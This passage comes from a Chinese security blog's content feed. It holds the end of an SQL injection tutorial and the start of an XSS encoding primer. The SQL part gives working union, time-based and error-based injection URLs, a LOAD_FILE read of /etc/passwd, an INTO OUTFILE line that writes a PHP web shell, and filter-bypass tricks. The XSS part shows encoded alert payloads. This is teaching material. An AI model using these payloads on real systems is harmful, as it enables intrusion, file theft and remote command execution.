+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">23</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;test&#x27;</span>,<span class="keyword">NULL</span>,<span class="keyword">NUll</span>,<span class="keyword">NUll</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">23</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="string">&#x27;test&#x27;</span>,<span class="keyword">NUll</span>,<span class="keyword">NUll</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">23</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;test&#x27;</span>,<span class="keyword">NUll</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">23</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NUll</span>,<span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只要查询能顺利执行，不返回错误，则可以知道该值为字符串值，则可以用该字段获取数据库信息。</p>
+<h5 id="2-2-获取数据库信息"><a href="#2-2-获取数据库信息" class="headerlink" title="2.2 获取数据库信息"></a>2.2 获取数据库信息</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">23</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="built_in">system_user</span>,<span class="keyword">NUll</span>,<span class="keyword">NUll</span></span><br></pre></td></tr></table></figure>
+
+<p>通过连接运算法以此获取多个数据。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="built_in">system_user</span> <span class="operator">+</span> <span class="string">&#x27;|&#x27;</span> <span class="operator">+</span> db_name(),<span class="keyword">NULL</span>,<span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 插入字符串|提高可读性</span></span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="built_in">system_user</span><span class="operator">%</span><span class="number">2</span>B<span class="string">&#x27;|&#x27;</span><span class="operator">%</span><span class="number">2</span>Bdb_name(),<span class="keyword">NULL</span>,<span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-3-强制类型转换"><a href="#2-3-强制类型转换" class="headerlink" title="2.3 强制类型转换"></a>2.3 强制类型转换</h5><p>如果要查询的信息不属于字符串或数据类型不匹配，则可以使用强制类型转换，转换为字符串。</p>
+<p>[强制类型转换运算符](#5. 强制类型转换)</p>
+<h3 id="三、使用条件语句"><a href="#三、使用条件语句" class="headerlink" title="三、使用条件语句"></a>三、使用条件语句</h3><h4 id="1-条件语句介绍"><a href="#1-条件语句介绍" class="headerlink" title="1. 条件语句介绍"></a>1. 条件语句介绍</h4><table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL</td>
+<td>IF(‘a’&#x3D;’a’) SELECT 1 ELSE SELECT 2</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>IF(<em>condition</em>, <em>value_if_true</em>, <em>value_if_false</em>)</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>SELECT CASE WHEN ‘a’&#x3D;’a’ THEN1 ELSE 2 END FROM DUAL<br />SELECT decode(substr(user,1,1),’A’,1,2) FROM DUAL</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT CASE WHEN(1&#x3D;1) THEN ‘a’ else ‘b’ END</td>
+</tr>
+</tbody></table>
+<h4 id="2-利用条件语句获取数据库信息"><a href="#2-利用条件语句获取数据库信息" class="headerlink" title="2.利用条件语句获取数据库信息"></a>2.利用条件语句获取数据库信息</h4><h5 id="2-1-基于时间"><a href="#2-1-基于时间" class="headerlink" title="2.1 基于时间"></a>2.1 基于时间</h5><p>使用条件语句利用SQL注入时，第一种方法是基于Web应用响应时间上的差异来获取某些信息的值。</p>
+<h6 id="2-1-1-MSSQL"><a href="#2-1-1-MSSQL" class="headerlink" title="2.1.1 MSSQL"></a>2.1.1 MSSQL</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.asp?id=2;IF (system_user=&#x27;sa&#x27; waitfor delay &#x27;0:0:5&#x27;)--</span><br><span class="line">--如果条件满足，则等待5s</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-2-基于错误"><a href="#2-2-基于错误" class="headerlink" title="2.2 基于错误"></a>2.2 基于错误</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.asp?id=12/is_srvrolemember(&#x27;sysadmin&#x27;)</span><br><span class="line">--is_srvrolemember() 是一个SQLServer T-SQL函数，当用户属于指定的组的时候返回1，否则返回0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.asp?id=12%2B(case when (system_user=&#x27;sa&#x27;) then 1 else 0 end)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--字符型注入</span><br><span class="line">http://www.a.com/a.asp?search.asp?brand=ac&#x27;%2Bchar(108%2B(case when (system_user = &#x27;sa&#x27;) then 1 else 0 end))%2B&#x27;e</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="十、文件读取-amp-写入"><a href="#十、文件读取-amp-写入" class="headerlink" title="十、文件读取&amp;写入"></a>十、文件读取&amp;写入</h3><h4 id="1-MySQL"><a href="#1-MySQL" class="headerlink" title="1. MySQL"></a>1. MySQL</h4><h5 id="1）-LOAD-FILE-函数"><a href="#1）-LOAD-FILE-函数" class="headerlink" title="1） LOAD_FILE 函数"></a>1） LOAD_FILE 函数</h5><p>他能够读取文件并将文件内容作为字符串返回。<br>需要提供文件的完整路径，调用该函数的用户需要有FILE权限</p>
+<p>示例：<code>UNION ALL SELECT LOAD_FULE(‘/etc/passwd’)--</code></p>
+<h5 id="2）INTO-OUTFILE-函数"><a href="#2）INTO-OUTFILE-函数" class="headerlink" title="2）INTO OUTFILE 函数"></a>2）INTO OUTFILE 函数</h5><p>创建系统文件并进行写操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT &quot;&lt;? system($_REQUEST[&#x27;cmd&#x27;]; ?)&gt;&quot; INTO OUTFILE &quot;/var/www/html/victim.com/cmd.php&quot; -</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-常见的绕过技巧"><a href="#0x04-常见的绕过技巧" class="headerlink" title="0x04 常见的绕过技巧"></a>0x04 常见的绕过技巧</h2><p>使用注释绕过过滤<br>如用多行注释绕过空格</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.aspx?uid<span class="operator">=</span><span class="number">45</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-SQLi之白盒审计"><a href="#0x05-SQLi之白盒审计" class="headerlink" title="0x05 SQLi之白盒审计"></a>0x05 SQLi之白盒审计</h2><h2 id="0x06-常用的测试工具"><a href="#0x06-常用的测试工具" class="headerlink" title="0x06 常用的测试工具"></a>0x06 常用的测试工具</h2><h2 id="0x07-SQL修复建议"><a href="#0x07-SQL修复建议" class="headerlink" title="0x07 SQL修复建议"></a>0x07 SQL修复建议</h2><h3 id="一、安全的数据库配置"><a href="#一、安全的数据库配置" class="headerlink" title="一、安全的数据库配置"></a>一、安全的数据库配置</h3><p>以普通的用户身份运行数据库服务器，而不要使用内置账户来连接数据库（Windows下的Oracle必须以SYSTEM权限运行）。功能强大的内置账户可以在数据库上执行很多与程序需求无关的操作（如：xp_cmdshell; OPENROWSET; LOAD_FILE ; ActiveX Java等）</p>
+<h2 id="参考-amp-致谢"><a href="#参考-amp-致谢" class="headerlink" title="参考&amp;致谢"></a>参考&amp;致谢</h2><blockquote>
+<p>【SQL注入攻击与防御（第2版）】</p>
+<p><a href="%5Bhttp://blackwolfsec.cc/2018/03/13/Mysql_sleep/%5D(http://blackwolfsec.cc/2018/03/13/Mysql_sleep/)">Mysql 执行优先级和sleep函数延时注入的一个Tip</a></p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-7840.html">SQL注入速查表（上）</a></p>
+<p>(<a href="http://vinc.top/2017/04/01/sql%E6%B3%A8%E5%85%A5/mysql-limit-%E6%B3%A8%E5%85%A5/">mysql limit 注入</a>)</p>
+<p><a href="https://www.w3schools.com/">w3schools</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS系列(1)——XSS基础知识</title>
+    <url>/2020/03/28/XSS%E7%B3%BB%E5%88%97-1-%E4%B9%8BXSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="XSS系列-1-——XSS基础知识"><a href="#XSS系列-1-——XSS基础知识" class="headerlink" title="XSS系列(1)——XSS基础知识"></a>XSS系列(1)——XSS基础知识</h1><p>俗话说：「万丈高楼平地起」「不积跬步无以至千里」。<br>学习任何专业，基础知识非常的重要。基础知识是否扎实，决定了你能走多远。</p>
+<p>目前网络上关于XSS的知识、介绍非常的多，成系统、系列的介绍却不多。本文争取集各家之所长，由浅及深的介绍XSS的相关知识。本文是XSS系列第一篇，先来介绍XSS相关的基础知识。因小弟才疏学浅，不足之处还望各位大佬多多指教。</p>
+<p>本文参考了很多大佬的分享原作，在此表示感谢。我只是一个知识的搬运工。</p>
+<h2 id="0x01-浏览器编码"><a href="#0x01-浏览器编码" class="headerlink" title="0x01 浏览器编码"></a>0x01 浏览器编码</h2><p>提到XSS，便不得不讲浏览器编码。浏览器编码虽不复杂，却也有许多细节之处常常被人忽略，而对于细节的掌握和理解是否到位，决定了有时候能否成功的编写一个XSS poc。</p>
+<p>下面简单介绍下各类的编码类型。</p>
+<h3 id="1-编码类型"><a href="#1-编码类型" class="headerlink" title="1. 编码类型"></a>1. 编码类型</h3><p>浏览器在解析HTML时，是按照一定的格式和编码来解析的，为了不扰乱HTML结构，有HTML编码（比如：<code>&lt;对应&amp;lt;</code>）;为了不扰乱JS的语法，有JS编码（比如：<code>&#39;对应\&#39;</code>），为了正常解析URL，有URL编码（比如：&amp;对应%26）。总结起来也就三类，但是有不同的编码形式。</p>
+<p>在呈现HTML页面时，针对某些特殊字符如<code>&lt;</code>或<code>&gt;</code>直接使用，浏览器会误以为它们标签的开始或结束，若想正确的在HTML页面呈现特殊字符就需要用到其对应的字符实体。</p>
+<h4 id="1-1-HTML编码"><a href="#1-1-HTML编码" class="headerlink" title="1.1 HTML编码"></a>1.1 HTML编码</h4><p>HTML编码形式最常见的有三种：<strong>别名形式、16进制形式、10进制形式</strong>，比如：<code>&lt;&gt;&quot;&#39;</code>采用这三种方式编码后分别如下：</p>
+<ul>
+<li>字符编码（别名形式）：<code>&amp;lt;&amp;gt;&amp;quot;&amp;apos;</code></li>
+<li>16进制形式：<code>&amp;#x3c;&amp;#x3e;&amp;#x22;&amp;#x27;</code></li>
+<li>10进制形式: <code>&amp;#60;&amp;#62;&amp;#34;&amp;#39;</code></li>
+</ul>
+<p><strong>HTML编码的这几种方式可以混合出现，浏览器都可以正常解析。</strong><br><strong>上述三种形式的分号均可以省略。</strong></p>
+<h4 id="1-2-JS编码"><a href="#1-2-JS编码" class="headerlink" title="1.2 JS编码"></a>1.2 JS编码</h4><p>JS编码形式最常见的有四种：斜杠转义形式、16进制形式、Unicode编码形式。<code>&lt;&gt;&quot;&#39;</code>采用这几种方式编码后分别如下：</p>
+<p>斜杠转义形式：<code>\&lt;\&gt;\&quot;\&#39; </code><br>16进制形式：<code>\x3c\x3e\x22\x27</code><br>Unicode编码形式：<code>\u003c\u003e\u0022\u0027</code></p>
+<p><strong>注意：</strong></p>
+<ul>
+<li>在Unicode编码形式中，中间的字符可以是1-7个字符。如<code>\u000003c</code>。但是笔者在用最新版的Chrome浏览器中测试的时候，只有四个字符可以被正确的识别。各种缘由，暂不清楚。</li>
+<li>这几种方式也可以混合出现。</li>
+<li>一般的斜杠转义形式不对字母、数字进行转义，因为可能出现混乱的情况，比如：\x\3\c并不会按想象中那样解析成x3c，而是会报语法错误。</li>
+</ul>
+<h4 id="1-3-URL编码"><a href="#1-3-URL编码" class="headerlink" title="1.3 URL编码"></a>1.3 URL编码</h4><p>URL编码估计大家都非常熟悉，编码都采用%XX的形式，比如同样的<code>&lt;&gt;&quot;&#39;</code>经URL编码后得到%3C%3E%22%27。</p>
+<p>需要注意的是，URL编码可以细分为encodeURI,encodeURIComponent两种编码形式，下面将简单说明一下两周编码形式的区别。</p>
+<p><strong>encodeURI</strong></p>
+<p>encodeURI 是用来处理整个 URI 的，它应该接受 URI 的 protocol, host, port以及URL中的功能字符<code>&amp;?/=</code> 等部分，只对 path 和 query 进行编码。</p>
+<p>如果 POST 请求的 Request Header 中 Content-Type 为「application&#x2F;x-www-form-urlencoded」， 那么 Request Payload 里面的数据一般就是使用 encodeURI(Component) 编码的。</p>
+<p><strong>encodeURIComponent</strong></p>
+<p>encodeURIComponent 对所有的字符均编码。</p>
+<p><strong>举例</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">encodeURI</span>(<span class="string">&#x27;https://www.baidu.com/ a b c&#x27;</span>)</span><br><span class="line"><span class="string">&quot;https://www.baidu.com/%20a%20b%20c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;https://www.baidu.com/ a b c&#x27;</span>)</span><br><span class="line"><span class="string">&quot;https%3A%2F%2Fwww.baidu.com%2F%20a%20b%20c&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实除了以上两种URL编码外，还有escape编码，但因为escape已经从 Web 标准中删除，所以此处不做介绍。</p>
+<h3 id="2-编码位置"><a href="#2-编码位置" class="headerlink" title="2. 编码位置"></a>2. 编码位置</h3><p>HTML页面中我们可以按照指定的编码格式去编码，但是，必须要在合适的位置用合适的编码，以及符合浏览器的解码规则和顺序，否则浏览器也无法识别。</p>
+<h4 id="2-1-HTML编码适用位置"><a href="#2-1-HTML编码适用位置" class="headerlink" title="2.1 HTML编码适用位置"></a>2.1 HTML编码适用位置</h4><p>HTML编码适用于属性值、标签内的内容，看如下示例：</p>
+<p><img src="/images/image-20191105184712054.png" alt="image-20191105184712054"></p>
+<p>浏览器解析后如下图：</p>
+<p><img src="/images/image-20191105184724878.png" alt="image-20191105184724878"></p>
+<p>可以看到：</p>
+<ol>
+<li>标签内使用html编码，被解析出来了，并且不影响DOM结构。</li>
+<li>属性值使用html编码，被解析出来了，并且在url、js事件、css中也是如此。</li>
+<li>属性名使用html编码，没有被解析出来</li>
+</ol>
+<p>但是，在<code>&lt;script&gt;</code>标签内的js内容以及<code>&lt;style&gt;</code>中的css内容，浏览器是不会使用html编码解码的：</p>
+<p><img src="/images/image-20191105184807888.png" alt="image-20191105184807888"></p>
+<h4 id="2-2-JS编码适用位置"><a href="#2-2-JS编码适用位置" class="headerlink" title="2.2 JS编码适用位置"></a>2.2 JS编码适用位置</h4><p>JS编码则只适用于JS代码中，包括<code>&lt;script&gt;</code>内和JS事件中：</p>
+<p><img src="/images/image-20191105184828120.png" alt="image-20191105184828120"></p>
+<p>对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。所以，对<code>(&#39;&#39;)</code>等进行js编码是失败的。</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="title function_">alert</span>(<span class="string">&#x27;dafaf&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以对dafaf施行16进制编码Unicode编码形式以及斜杠转义形式<br>只可以对alert施行Unicode编码<br>不能对<code>(&#39;&#39;)</code>编码</p>
+<p>我们来分析一下JavaScript解析的一个细节，Javascript解析器工作的时候将\u0061\u006c\u0065\u0072\u0074进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。<strong>像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称</strong>，例如：<code>&lt;script&gt;alert(&#39;LDkR\u0027)&lt;/script&gt;</code>对控制字符单引号进行js编码，解析时\u0027被解码成文本单引号，无法闭合因此不能成功执行。</p>
+<h4 id="2-3-URL编码适用位置"><a href="#2-3-URL编码适用位置" class="headerlink" title="2.3 URL编码适用位置"></a>2.3 URL编码适用位置</h4><p>URL编码则只适用于为URL的属性值，且只能对URL中的参数进行URL编码。比如：<code>&lt;a&gt;</code>标签的href属性、<code>&lt;iframe&gt;</code>的src属性等。</p>
+<h3 id="3-浏览器解析顺序"><a href="#3-浏览器解析顺序" class="headerlink" title="3. 浏览器解析顺序"></a>3. 浏览器解析顺序</h3><p>既然各个编码有适合自己的位置，并且这种位置必定会重合，所以，浏览器解码必定有一定的顺序。</p>
+<p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。</p>
+<p>浏览器无论什么情况都会遵守一个这样的解码规则：</p>
+<blockquote>
+<p>1、 HTML 解析器对 HTML 文档进行解析，完成 HTML 解码并且创建 DOM 树</p>
+<p>2、 JavaScript 或者 CSS 解析器对内联脚本进行解析，完成 JS、CSS 解码</p>
+<p>3、 URL 解码会根据 URL 所在的顺序不同而在 JS 解码前或者解码后</p>
+</blockquote>
+<p>下面，讲距离几个具体的例子，对解码顺序做一些说明，以方便理解和记忆。</p>
+<h4 id="3-1-解码举例1"><a href="#3-1-解码举例1" class="headerlink" title="3.1 解码举例1"></a>3.1 解码举例1</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span>lert(1)&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;1&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&amp;#35; on\u0065rror=&amp;#97;lert&amp;#40;1)&gt;&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>一个正常的容易理解的过程是这一行：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span>lert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTML 解析到标签，建立DOM 树，然后对节点内容进行实体解码，&amp;#97； 就变成a, 随后在js 解析阶段，正常的触发了弹窗，先后顺序OK。</p>
+<p>但对于下面这段代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;1&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;img src=&amp;#35; on\u0065rror=&amp;#97;lert&amp;#40;1)&gt;&quot;</span>;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>使用了DOM 操作，修改前边标签中的内容，添加了一个img 内容，因为进入了script 进入了JavaScript的特殊解析模式，所以此处HTML 不得干扰，首先JavaScript解析器，会先对其中编码的内容解码，于是onerror 就还原回来了，于是正常的执行了JS 语句，在HTML 文档中，将hello 变成了img。img标签内容变成了：</p>
+<p><code>&lt;img src=&amp;#35; onerror=&amp;#97;lert&amp;#40;1)&gt;</code></p>
+</li>
+<li><p>该标签传回给HTML，HTML 建立DOM节点，HTML解码节点内容：<code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+</li>
+<li><p>onerror 又会执行其中的JS 脚本，弹出窗口。</p>
+</li>
+</ol>
+<p>其实，这里也不难理解，因为HTML 是从上到下解析，遇到&lt; script&gt; 于是进入了特殊的解析模式，使用JS 解析器，做了一个DOM 操作，该DOM 操作修改了前边的DOM 树，该块内容，需要使用HTML 解析重塑DOM 树，那么节点内容中的实体编码就会被解码，然后onerror 中触发脚本，JS 又会对内容进行一次解析。</p>
+<p>总结说来，实际上，DOM 操作实际上是js强势介入 HTML 和CSS 的结果，使用DOM 操作，对DOM Tree 造成了改变，会调用到HTML 解析器重新对其解析，于是流程又会返回到最开始说的那个解析流程里去。</p>
+<h4 id="3-2-解码举例2"><a href="#3-2-解码举例2" class="headerlink" title="3.2 解码举例2"></a>3.2 解码举例2</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>针对上述a标签我们分析一下该环境中浏览器的解析顺序，首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：“<a href="https://www.baidu.com“,那么url解析器工作完成后是不需要其他解码的,但是该环境中url资源类型为javascript,因此该环境中最后一步javascript解析器还会进行解码操作,最后解析的脚本被执行./">https://www.baidu.com“，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为JavaScript，因此该环境中最后一步JavaScript解析器还会进行解码操作，最后解析的脚本被执行。</a></p>
+<p><strong>整个解析顺序为3个环节：HTML解码 –&gt; URL解码 –&gt; JS解码</strong></p>
+<p><strong>变形1：</strong>URL编码 <code>javascript:alert(1)</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">URL编码“javascript:alert(1)”=“%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29”</span><br><span class="line"></span><br><span class="line">编码后：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，该脚本并不会被正常的执行。这里就有一个URL解析过程中的一个细节了，<strong>不能对协议类型进行任何的编码操作</strong>，否则URL解析器会认为它无类型，就导致被编码的“javascript”没有解码，所以不会被URL解析器识别。</p>
+<p><strong>变形2：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML编码&quot;javascript&quot;=&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span>&quot;</span><br><span class="line">URL编码&quot;alert(2)&quot;=” %61%6C%65%72%74%28%32%29”</span><br><span class="line"></span><br><span class="line">编码后:</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span>:%61%6C%65%72%74%28%32%29&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>HTML解析器工作时，href里的HTML实体会被解码。变成<code>&lt;a href=&quot;javascript:%61%6C%65%72%74%28%32%29&quot;</code></p>
+</li>
+<li><p>接下来URL解析器工作解析href属性里的链接时，”javascript”协议在第一步被HTML解码了，这样URL解析器是可以识别的，然后继续解析后面的”%61%6C%65%72%74%28%32%29”，变成<code>&lt;a href=&quot;javascript:a lert(1)&quot;&gt;</code></p>
+</li>
+<li><p>最后JavaScript解析器完成解析操作，脚本执行。</p>
+</li>
+</ol>
+<p><strong>变形3：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">对<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(3)&quot;</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span>做JS编码&gt;URL编码&gt;HTML编码共3层。</span><br><span class="line"></span><br><span class="line">JS编码：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">URL编码：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">HTML编码：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span 